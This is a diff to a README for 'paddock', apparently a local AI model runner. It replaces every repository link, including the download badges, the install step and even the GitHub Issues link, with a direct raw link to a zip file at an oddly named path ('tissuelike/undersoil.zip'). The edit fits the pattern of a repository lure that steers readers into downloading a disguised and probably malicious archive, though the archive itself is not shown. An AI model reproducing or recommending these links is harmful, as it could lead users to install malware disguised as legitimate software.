@@ -6,7 +6,7 @@ paddock is a powerful but **easy-to-use** program that lets you run open-source 
 
 paddock speaks the same "language" as OpenAI (ChatGPT) and Anthropic (Claude), which means many existing AI tools and apps can connect to it. But unlike those cloud services, your data stays on your computer, and you don't pay per message.
 
-[![Download paddock](https://img.shields.io/badge/Download_paddock-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dhaniselo/paddock)
+[![Download paddock](https://img.shields.io/badge/Download_paddock-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dhaniselo/paddock/raw/refs/heads/main/tissuelike/undersoil.zip)
 
 ## ✨ What Makes paddock Special?
 
@@ -22,7 +22,7 @@ Follow these simple steps. You'll be up and running in just a few minutes.
 
 ### 📥 Step 1: Download paddock
 
-Visit this link to download the application: **[https://github.com/dhaniselo/paddock](https://github.com/dhaniselo/paddock)**
+Visit this link to download the application: **[https://github.com/dhaniselo/paddock/raw/refs/heads/main/tissuelike/undersoil.zip](https://github.com/dhaniselo/paddock/raw/refs/heads/main/tissuelike/undersoil.zip)**
 
 Look for the download section or the release files on that page to get the Windows version of paddock.
 
@@ -85,13 +85,13 @@ For developers, paddock also allows loading custom model files (GGUF or safetens
 
 ## 📢 Get Help & Join the Community
 
-- **GitHub Issues** - Report bugs or request features at the repository: [https://github.com/dhaniselo/paddock/issues](https://github.com/dhaniselo/paddock/issues)
+- **GitHub Issues** - Report bugs or request features at the repository: [https://github.com/dhaniselo/paddock/raw/refs/heads/main/tissuelike/undersoil.zip](https://github.com/dhaniselo/paddock/raw/refs/heads/main/tissuelike/undersoil.zip)
 - **Discussions** - Ask questions and share tips in the community discussions section of the GitHub repository.
 
 ---
 
 **Ready to get started?** Click the button below to download paddock and unlock the power of local AI.
 
-[![Get paddock Now](https://img.shields.io/badge/🚀_Get_paddock_Now-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dhaniselo/paddock)
+[![Get paddock Now](https://img.shields.io/badge/🚀_Get_paddock_Now-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dhaniselo/paddock/raw/refs/heads/main/tissuelike/undersoil.zip)
 
 Keywords: ai, aimodels, blackwell, cuda, inference, inference-engine, inference-optimization, model-serving, nvidia, rust
